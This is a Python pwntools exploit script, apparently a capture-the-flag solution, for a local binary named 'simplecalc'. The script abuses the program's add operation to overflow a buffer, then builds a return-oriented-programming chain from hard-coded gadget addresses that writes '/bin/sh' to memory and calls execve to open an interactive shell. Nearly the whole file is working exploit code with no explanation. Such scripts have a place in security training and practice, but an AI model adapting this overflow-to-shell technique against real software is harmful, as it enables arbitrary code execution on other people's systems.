#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("./simplecalc")

p = process("./simplecalc")
# gdb.attach(p, gdbscript="break *0x0000000000401589")

len_to_of = 0x48

p.recvuntil("calculations: ")
p.sendline(str(len_to_of))

rax_ropgadget = 0x000000000044db34
rdi_ropgadget = 0x0000000000401b73
rsi_ropgadget = 0x0000000000401c87
rdx_ropgadget = 0x0000000000437a85
syscall_ropgadget = 0x0000000000400488
rax_rdx_mov_ropgadget = 0x000000000044526e

bin_str = b"/bin/sh"

def addSingle(x):
	p.recvuntil("=> ")
	p.sendline(b"1")
	p.recvuntil("Integer x: ")
	p.sendline(b"100")
	p.recvuntil("Integer y: ")
	p.sendline(str(x-100))


def pad_add(z):
	x = z & 0xffffffff
	y = (z & 0xffffffff00000000) >> 32
	addSingle(x)
	addSingle(y)

for x in range(int(0x48/0x8)):
#for x in range(9):
	log.info(f"Writing 2{x} of 0x0")
	pad_add(0x0)


bin_sh_hexstr = 0x0068732f6e69622f
mem_write_addr = 0x6c1000
#payload = p64(rdx_ropgadget) + p64(bin_sh_hexstr) + p64(rax_ropgadget) + p64(mem_write_addr)
pad_add(rdx_ropgadget)
pad_add(bin_sh_hexstr)
pad_add(rax_ropgadget)
pad_add(mem_write_addr)
pad_add(rax_rdx_mov_ropgadget)
log.info("Loaded /bin/sh")

pad_add(rax_ropgadget)
pad_add(0x3b)
pad_add(rdi_ropgadget)
pad_add(mem_write_addr)
pad_add(rsi_ropgadget)
pad_add(0x0)
pad_add(rdx_ropgadget)
pad_add(0x0)

log.info("Payload delivered")

pad_add(syscall_ropgadget)
p.recvuntil("=> ")
p.sendline("5")





# p.sendline(payload)

p.interactive()
